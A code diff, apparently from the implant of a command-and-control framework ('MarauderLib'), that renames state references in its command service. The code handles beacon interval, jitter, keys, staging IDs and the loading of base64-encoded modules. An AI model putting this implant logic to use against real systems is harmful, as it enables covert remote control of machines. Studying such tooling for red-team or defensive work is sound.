@@ -24,13 +24,13 @@ namespace MarauderLib.Services
         runningTask.TaskName = agentTask.Name;
         runningTask.Task = new Task(() => ProcessCommand(agentTask), runningTask.CancellationTokenSource.Token);
         runningTask.Task.Start();
-        Marauder.RunningTasks.Add(runningTask);
+        State.RunningTasks.Add(runningTask);
       }
     }
 
     public CommandService()
     {
-      Marauder.CryptoService.OnMessageDecrypted += TaskWatcher;
+      State.CryptoService.OnMessageDecrypted += TaskWatcher;
     }
     
     private TaskResult ProcessCommand(AgentTask agentTask)
@@ -100,25 +100,25 @@ namespace MarauderLib.Services
         switch (command[0].ToLower())
         {
           case "agent_id":
-            Marauder.Id = command[1];
+            State.Id = command[1];
             break;
           case "beaconinterval":
-            Marauder.Sleep = Int32.Parse(command[1]);
+            State.Sleep = Int32.Parse(command[1]);
             break;
           case "jitter":
-            Marauder.Jitter = float.Parse(command[1]);
+            State.Jitter = float.Parse(command[1]);
             break;
           case "key":
-            Marauder.Key = command[1];
+            State.Key = command[1];
             break;
           case "payloadname":
-            Marauder.PayloadName = null;
+            State.PayloadName = null;
             break;
           case "stagingid":
-            Marauder.StagingId = null;
+            State.StagingId = null;
             break;
           case "expirationdate":
-            Marauder.ExpirationDate = DateTime.Parse(command[1]);
+            State.ExpirationDate = DateTime.Parse(command[1]);
             break;
           default:
             result = $"No setting matches {command[0]}";
@@ -138,7 +138,7 @@ namespace MarauderLib.Services
         byte[] bytes = Convert.FromBase64String(commandParts[2]);
         if (commandParts[0].ToLower() == "module") {
           TaskResult moduleResult  = LoadModule(agentTask.Name, name, bytes);
-          Marauder.ResultQueue.Add(moduleResult);
+          State.ResultQueue.Add(moduleResult);
           return moduleResult;
         }
         if (commandParts[0].ToLower() == "transport") {
@@ -159,7 +159,7 @@ namespace MarauderLib.Services
       taskResult.ContentId = contentId;
       taskResult.Content = content;
       taskResult.IOCs = iocs;
-      Marauder.ResultQueue.Add(taskResult);
+      State.ResultQueue.Add(taskResult);
 #if DEBUG      
       Logging.Write("CommandService", String.Format("Returning Results: {0}", result));
 #endif      
